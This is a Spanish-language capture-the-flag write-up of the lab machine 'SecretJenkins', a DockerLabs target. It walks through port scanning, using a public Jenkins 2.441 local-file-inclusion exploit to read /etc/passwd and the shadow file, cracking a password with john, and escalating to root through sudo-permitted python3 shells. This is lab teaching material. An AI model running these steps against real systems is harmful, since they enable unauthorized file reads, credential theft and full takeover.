#MAQUINA #DOCKERLABS #FACIL 
#LFI 
<hr>
# RECONOCIMIENTO

Vamos a resolver **SecretJenkins** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 11:53 CET
Initiating ARP Ping Scan at 11:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:53, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 8080/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:53, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-05 11:53:24 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **8080(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,8080 172.17.0.2                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 11:54 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 11:54 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
| http-enum: 
|   /robots.txt: Robots file
|   /api/: Potentially interesting folder
|_  /secured/: Potentially interesting folder (401 Unauthorized)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds

whatweb "http://172.17.0.2:8080/"
http://172.17.0.2:8080/ [403 Forbidden] Cookies[JSESSIONID.9839292f], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.9839292f], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://172.17.0.2:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.9839292f], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.9839292f], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], PasswordField[j_password], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session], X-Frame-Options[sameorigin]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Posible **Jenkins** en el puerto **8080**.

# EXPLOTACION

Al revisar la web que hay en el puerto **8080** , usamos **searchsploit**:

   ```bash
searchsploit jenkins 
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudBees Jenkins 2.32.1 - Java Deserialization                                                                     | java/dos/41965.txt
Jenkins - Script-Console Java Execution (Metasploit)                                                                | multiple/remote/24272.rb
Jenkins - XStream Groovy classpath Deserialization (Metasploit)                                                     | multiple/remote/43375.rb
Jenkins 1.523 - Persistent HTML Code                                                                                | php/webapps/30408.txt
Jenkins 1.578 - Multiple Vulnerabilities                                                                            | multiple/webapps/34587.txt
Jenkins 1.626 - Cross-Site Request Forgery / Code Execution                                                         | java/webapps/37999.txt
Jenkins 1.633 - Credential Recovery                                                                                 | java/webapps/38664.py
Jenkins 2.137 and Pipeline Groovy Plugin 2.61 - ACL Bypass and Metaprogramming Remote Code Execution (Metasploit)   | java/remote/46572.rb
Jenkins 2.150.2 - Remote Command Execution (Metasploit)                                                             | linux/webapps/46352.rb
Jenkins 2.235.3 - 'Description' Stored XSS                                                                          | java/webapps/49237.txt
Jenkins 2.235.3 - 'tooltip' Stored Cross-Site Scripting                                                             | java/webapps/49232.txt
Jenkins 2.235.3 - 'X-Forwarded-For' Stored XSS                                                                      | java/webapps/49244.txt
Jenkins 2.441 - Local File Inclusion                                                                                | java/webapps/51993.py
Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in                                                           | java/webapps/48904.txt
Jenkins < 1.650 - Java Deserialization                                                                              | java/remote/42394.py
Jenkins build-metrics plugin 1.3 - 'label' Cross-Site Scripting                                                     | java/webapps/47598.py
Jenkins CI Script Console - Command Execution (Metasploit)                                                          | multiple/remote/24206.rb
Jenkins CLI - HTTP Java Deserialization (Metasploit)                                                                | linux/remote/44642.rb
Jenkins CLI - RMI Java Deserialization (Metasploit)                                                                 | java/remote/38983.rb
Jenkins Dependency Graph View Plugin 0.13 - Persistent Cross-Site Scripting                                         | java/webapps/47111.txt
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting                                                   | java/webapps/47927.txt
Jenkins Mailer Plugin < 1.20 - Cross-Site Request Forgery (Send Email)                                              | linux/webapps/44843.py
Jenkins Plugin Script Security 1.49/Declarative 1.3.4/Groovy 2.60 - Remote Code Execution                           | java/webapps/46453.py
Jenkins Plugin Script Security < 1.50/Declarative < 1.3.4.1/Groovy < 2.61.1 - Remote Code Execution (PoC)           | java/webapps/46427.txt
Jenkins Software RakNet 3.72 - Remote Integer Underflow                                                             | multiple/remote/33802.txt
SonarQube Jenkins Plugin - Plain Text Password                                                                      | php/webapps/30409.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Hay un exploit que se aprovecha de un **LFI** para la version 2.441 de Jenkins.

IMPORTANTE : el script al ejecutarlo sale un error (TypeError: to_bytes() missing required argument 'byteorder' (pos 2)).
**Para corregirlo , a esa función todas las veces que se use, agregarle un segundo argumento -> 'big'** 

   ```bash
python3 51993.py -u "http://172.17.0.2:8080/" -p /etc/passwd                 
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bobby:x:1001:1001::/home/bobby:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash
```

2 USUARIOS -> **bobby** y **pinguinito**

Nos traemos el shadow y hacemos lo siguiente:
```
└─# unshadow passwd shadow > z
                                                                                                                                                                   
└─# john z --show
bobby:chocolate:1001:1001::/home/bobby:/bin/bash

1 password hash cracked, 0 left
```

# ESCALADA PRIVILEGIOS

Buscamos archivos con permisos SUDO:
   ```bash
bobby@2e144b9a6335:~$ sudo -l
Matching Defaults entries for bobby on 2e144b9a6335:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bobby may run the following commands on 2e144b9a6335:
    (pinguinito) NOPASSWD: /usr/bin/python3

```

Vemos **python3** con permisos SUDO :
   ```bash
bobby@2e144b9a6335:~$ sudo -u pinguinito python3 -c 'import os; os.system("/bin/sh")'
                                                               
$ whoami                                                       
pinguinito

```

YA ESTAMOS COMO PINGUINITO.

Buscamos archivos con permisos SUDO:
   ```bash
   
pinguinito@2e144b9a6335:/opt$ sudo -l
Matching Defaults entries for pinguinito on 2e144b9a6335:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pinguinito may run the following commands on 2e144b9a6335:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py


```

Vemos **/opt/script.py** con permisos SUDO al ejecutarlo con python3 :
   ```bash
pinguinito@2e144b9a6335:/opt$ sudo -l
Matching Defaults entries for pinguinito on 2e144b9a6335:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pinguinito may run the following commands on 2e144b9a6335:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
pinguinito@2e144b9a6335:/opt$ cat script.py 
import os
os.execv("/bin/bash",["-p"])
pinguinito@2e144b9a6335:/opt$ sudo /usr/bin/python3 /opt/script.py 
root@2e144b9a6335:/opt# whoami
root
root@2e144b9a6335:/opt# 

```

**YA ESTAMOS COMO ROOT.**